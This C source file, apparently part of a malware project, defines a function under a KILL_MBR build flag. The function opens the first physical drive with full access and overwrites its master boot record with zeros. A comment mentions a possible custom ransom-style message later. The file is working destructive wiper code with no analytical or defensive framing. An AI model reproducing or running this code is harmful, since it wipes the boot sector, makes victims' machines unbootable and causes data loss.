#include "../../Header-Files/pch.h"
#include "../../Header-Files/N0T-iLLerka.h"

#ifdef KILL_MBR
// at somepoint I might implement a custom MBR displaying a message
BOOL fnOverwriteMBR(VOID) {
	WCHAR szMbrData[nMBR];
	ZeroMemory(&szMbrData, sizeof(szMbrData));
	DWORD dwNOBW;

	HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hMbr) {
		if (WriteFile(hMbr, szMbrData, nMBR, &dwNOBW, NULL)) {
			CloseHandle(hMbr);
			return TRUE;
		} else {
#ifdef DEBUG_MSG
			fnErrorHandlerW(L"Couldn't overwrite MBR", NULL, L"WriteFile", MB_OK | MB_ICONERROR);
#endif // DEBUG_MSG
			CloseHandle(hMbr);
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		fnErrorHandlerW(L"Couldn't open Handle \"hMbr\" to MBR", NULL, L"CreateFileW", MB_OK | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}
}
#endif // KILL_MBR